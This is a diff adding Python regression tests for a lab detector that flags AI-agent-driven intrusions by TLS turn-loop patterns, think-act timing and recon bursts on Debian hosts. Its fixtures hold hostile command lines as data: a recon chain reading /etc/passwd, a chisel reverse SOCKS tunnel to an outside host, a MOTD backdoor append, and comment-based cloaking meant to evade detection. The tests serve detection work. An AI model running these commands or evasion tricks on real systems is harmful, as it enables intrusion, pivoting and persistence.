@@ -1,6 +1,7 @@
 """Automated validation for the reproducible host-only isolated KVM/QEMU Sensor + Target Lab (`lab/kvm/`)."""
 
 import importlib.util
+import json
 import os
 import shutil
 import subprocess
@@ -551,3 +552,206 @@ def test_pure_python_foxio_ja4_spec_grease_alpn_raw_ip_and_suricata_eve_ingestio
     eve_path.write_text("\n".join(json.dumps(r) for r in eve_rows) + "\n", encoding="utf-8")
     cands = scan_telemetry_file(eve_path)
     assert cands and "ja4_client_stack_whiplash" in cands[0].reasons
+
+
+def test_real_debian_auditd_pam_motd_and_shell_wrapper_zero_fp(tmp_path: Path) -> None:
+    """Falsification regression: real Debian 12 SSH pam_motd + bash -c/child + auid=4294967295 must produce 0 FP."""
+    exporter = _load_exporter()
+
+    # Build realistic Debian 12 auditd lines for 6 benign SSH admin commands + a 25s pause before log copy
+    audit_lines: list[str] = []
+    eid = 1000
+    t = 1795403000.0
+    admin_cmds = [
+        ("uname -a; uptime", "/usr/bin/uname", ["uname", "-a"]),
+        ("df -h; free -m", "/usr/bin/df", ["df", "-h"]),
+        ("ip addr show", "/usr/bin/ip", ["ip", "addr", "show"]),
+        ("ss -tulpn | head -n 15", "/usr/bin/ss", ["ss", "-tulpn"]),
+        ("ps aux | head -n 15", "/usr/bin/ps", ["ps", "aux"]),
+        ("cat /etc/os-release", "/usr/bin/cat", ["cat", "/etc/os-release"]),
+    ]
+    for full_cmd, child_exe, child_args in admin_cmds:
+        # sshd daemon re-exec with unset auid=4294967295 (must fall back to uid:0, NOT uid:4294967295!)
+        eid += 1
+        audit_lines.append(f'type=SYSCALL msg=audit({t:.3f}:{eid}): arch=c000003e syscall=59 success=yes auid=4294967295 uid=0 pid=100 ppid=1 comm="sshd" exe="/usr/sbin/sshd"')
+        audit_lines.append(f'type=EXECVE msg=audit({t:.3f}:{eid}): argc=3 a0="/usr/sbin/sshd" a1="-D" a2="-R"')
+        # Debian pam_motd burst (7 processes in 4ms including 10-uname -> uname -snrvm)
+        t += 0.08
+        for proc, ppid, pid, argv in [
+            ("/usr/bin/dash", 100, 101, ["sh", "-c", "/usr/bin/env -i PATH=/usr/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new"]),
+            ("/usr/bin/run-parts", 101, 102, ["run-parts", "--lsbsysinit", "/etc/update-motd.d"]),
+            ("/usr/bin/dash", 102, 103, ["/bin/sh", "/etc/update-motd.d/10-uname"]),
+            ("/usr/bin/uname", 103, 104, ["uname", "-snrvm"]),
+            ("/usr/bin/dash", 102, 105, ["/bin/sh", "/usr/share/unattended-upgrades/update-motd-unattended-upgrades"]),
+        ]:
+            eid += 1
+            a_str = " ".join(f'a{i}="{a}"' for i, a in enumerate(argv))
+            audit_lines.append(f'type=SYSCALL msg=audit({t:.3f}:{eid}): arch=c000003e syscall=59 success=yes auid=1000 uid=1000 pid={pid} ppid={ppid} comm="x" exe="{proc}"')
+            audit_lines.append(f'type=EXECVE msg=audit({t:.3f}:{eid}): argc={len(argv)} {a_str}')
+        # Parent bash -c + immediate child binary (must NOT double-count `ss -tulpn`!)
+        t += 0.04
+        eid += 1
+        audit_lines.append(f'type=SYSCALL msg=audit({t:.3f}:{eid}): arch=c000003e syscall=59 success=yes auid=1000 uid=1000 pid=200 ppid=100 comm="bash" exe="/usr/bin/bash"')
+        audit_lines.append(f'type=EXECVE msg=audit({t:.3f}:{eid}): argc=3 a0="bash" a1="-c" a2="{full_cmd}"')
+        eid += 1
+        ca_str = " ".join(f'a{i}="{a}"' for i, a in enumerate(child_args))
+        audit_lines.append(f'type=SYSCALL msg=audit({t:.3f}:{eid}): arch=c000003e syscall=59 success=yes auid=1000 uid=1000 pid=201 ppid=200 comm="c" exe="{child_exe}"')
+        audit_lines.append(f'type=EXECVE msg=audit({t:.3f}:{eid}): argc={len(child_args)} {ca_str}')
+        t += 2.4
+
+    # 25s human pause then a single `sudo cp` pipeline (3 execves in 4ms — must NOT trigger think_act_bimodal_cadence!)
+    t += 25.0
+    for proc, argv in [
+        ("/usr/bin/bash", ["bash", "-c", "sudo cp /var/log/audit/audit.log /tmp/out.log"]),
+        ("/usr/bin/sudo", ["sudo", "cp", "/var/log/audit/audit.log", "/tmp/out.log"]),
+        ("/usr/bin/cp", ["cp", "/var/log/audit/audit.log", "/tmp/out.log"]),
+    ]:
+        eid += 1
+        a_str = " ".join(f'a{i}="{a}"' for i, a in enumerate(argv))
+        audit_lines.append(f'type=SYSCALL msg=audit({t:.3f}:{eid}): arch=c000003e syscall=59 success=yes auid=1000 uid=1000 pid=300 ppid=100 comm="x" exe="{proc}"')
+        audit_lines.append(f'type=EXECVE msg=audit({t:.3f}:{eid}): argc={len(argv)} {a_str}')
+
+    events = exporter.convert_auditd_lines(audit_lines, hostname="debian-srv-01")
+    assert all(e["actor"] != "uid:4294967295" for e in events), "Unset auid=4294967295 must fall back to uid"
+    assert any(e["actor"] == "uid:0" for e in events)
+
+    out_jsonl = tmp_path / "debian_benign.jsonl"
+    out_jsonl.write_text("\n".join(json.dumps(e) for e in events) + "\n", encoding="utf-8")
+    assert scan_telemetry_file(out_jsonl) == []
+
+
+def test_compact_llm_tls_loop_and_single_shot_compound_recon_tp(tmp_path: Path) -> None:
+    """Falsification regression: compact real-LLM TLS loops (1.1KB->4.7KB, 540-797B resp) & compound SSH recon both fire."""
+    exporter = _load_exporter()
+
+    # 1. Compact stealth local/vLLM agent loop (real gemma4:26b stealth wire profile: 4.5s inter-turn sleep, 540-797B resp,
+    #    including a 255B RFC 8446 TLS 1.3 NewSessionTicket arriving 1ms after Turn 1's request!)
+    pkts: list[tuple[float, str, int, str, int, int]] = []
+    t = 1795405000.0
+    for idx, (ob, ib, lat, pause) in enumerate([
+        (1321, 771, 0.68, 4.5),
+        (2141, 771, 0.51, 4.5),
+        (2817, 708, 0.42, 4.5),
+        (3116, 782, 0.55, 0.01),
+        (3929, 802, 0.55, 4.5),
+        (4273, 738, 0.40, 0.0),
+    ]):
+        pkts.append((t, "192.0.2.10", 52001, "198.51.100.20", 8443, ob))
+        if idx == 0:
+            pkts.append((t + 0.001, "198.51.100.20", 8443, "192.0.2.10", 52001, 255))  # TLS 1.3 NewSessionTicket
+        t += lat
+        pkts.append((t, "198.51.100.20", 8443, "192.0.2.10", 52001, ib))
+        t += pause
+    pcap = tmp_path / "compact_stealth_llm.pcap"
+    _write_synthetic_pcap(pcap, pkts, linktype=276)
+    raw = tmp_path / "compact_raw"
+    raw.mkdir()
+    out_j = tmp_path / "compact.jsonl"
+    exporter.convert_directory(raw, out_j, pcap_path=pcap)
+    cands = scan_telemetry_file(out_j)
+    assert cands and "encrypted_tls_agent_turn_loop" in cands[0].reasons
+
+    # 2. Single-shot compound SSH recon chain (`uname -a; id; netstat -tunlp; ps aux; cat /etc/passwd`) fires endpoint_compressed_recon_burst
+    recon_j = tmp_path / "compound_recon.jsonl"
+    recon_j.write_text(
+        json.dumps(
+            {
+                "timestamp": "2026-11-23T03:11:33.748Z",
+                "source_host": "artex-target-01",
+                "actor": "uid:1000",
+                "event_type": "process",
+                "surface": "endpoint",
+                "appliance": "linux_auditd",
+                "process": "/usr/bin/bash",
+                "command_line": "bash -c uname -a; id; netstat -tunlp; ps aux | head -n 20; cat /etc/passwd | grep labops",
+                "status_code": 0,
+                "action": "execve",
+            }
+        )
+        + "\n",
+        encoding="utf-8",
+    )
+    rcands = scan_telemetry_file(recon_j)
+    assert rcands and "endpoint_compressed_recon_burst" in rcands[0].reasons
+
+
+def test_motd_cloaking_and_fast_40ms_think_act_evasion_regressions(tmp_path: Path) -> None:
+    """Adversarial regressions: MOTD-path/comment cloaking and 40ms sequential Think-Act bursts MUST still alert."""
+    # 1. Adversarial MOTD cloaking (`# /etc/update-motd.d/` appended to malicious commands & MOTD backdoor append)
+    cloak_rows = [
+        {
+            "timestamp": "2026-11-23T04:00:00.000Z",
+            "source_host": "debian-srv-02",
+            "actor": "uid:1000",
+            "event_type": "process",
+            "surface": "endpoint",
+            "appliance": "linux_auditd",
+            "process": "/usr/bin/bash",
+            "command_line": "bash -c uname -a; id; netstat -tunlp; ps auxww; cat /etc/passwd # /etc/update-motd.d/",
+            "status_code": 0,
+            "action": "execve",
+        },
+        {
+            "timestamp": "2026-11-23T04:00:01.000Z",
+            "source_host": "debian-srv-02",
+            "actor": "uid:1000",
+            "event_type": "process",
+            "surface": "endpoint",
+            "appliance": "linux_auditd",
+            "process": "/tmp/chisel",
+            "command_line": "/tmp/chisel client 198.51.100.5:443 R:socks # /etc/update-motd.d/",
+            "status_code": 0,
+            "action": "execve",
+        },
+        {
+            "timestamp": "2026-11-23T04:00:02.000Z",
+            "source_host": "debian-srv-02",
+            "actor": "uid:1000",
+            "event_type": "process",
+            "surface": "endpoint",
+            "appliance": "linux_auditd",
+            "process": "/usr/bin/dash",
+            "command_line": "sh -c echo pwn >> /etc/update-motd.d/10-uname",
+            "status_code": 0,
+            "action": "execve",
+        },
+    ]
+    cloak_path = tmp_path / "motd_cloak.jsonl"
+    cloak_path.write_text("\n".join(json.dumps(r) for r in cloak_rows) + "\n", encoding="utf-8")
+    ccands = scan_telemetry_file(cloak_path)
+    assert ccands, "MOTD comment/path cloaking must never drop malicious endpoint events"
+    assert len(ccands[0].sample_events) == 3, "All 3 cloaked/backdoor events must survive scaffolding filter"
+    assert "endpoint_compressed_recon_burst" in ccands[0].reasons
+    assert "socks_chisel_pivot_tunnel_mesh" in ccands[0].reasons
+
+    # 2. 40ms-spaced sequential commands -> 25s LLM inference pause -> 40ms-spaced sequential commands
+    #    must NOT collapse into 1 timestamp per burst (must still fire think_act_bimodal_cadence!)
+    from datetime import datetime, timezone
+
+    ta_rows = []
+    t = 1795408000.0
+    for burst_idx in range(2):
+        for step in range(4):
+            ts_str = datetime.fromtimestamp(t, tz=timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
+            ta_rows.append(
+                {
+                    "timestamp": ts_str,
+                    "source_host": "debian-srv-03",
+                    "actor": "uid:1000",
+                    "event_type": "process",
+                    "surface": "endpoint",
+                    "appliance": "linux_auditd",
+                    "process": f"/usr/local/bin/tool{burst_idx}_{step}",
+                    "command_line": f"tool{burst_idx}_{step} --probe",
+                    "status_code": 0,
+                    "action": "execve",
+                }
+            )
+            t += 0.04
+        t += 25.0
+    ta_path = tmp_path / "fast_40ms_think_act.jsonl"
+    ta_path.write_text("\n".join(json.dumps(r) for r in ta_rows) + "\n", encoding="utf-8")
+    tcands = scan_telemetry_file(ta_path)
+    assert tcands and "think_act_bimodal_cadence" in tcands[0].reasons
+
+
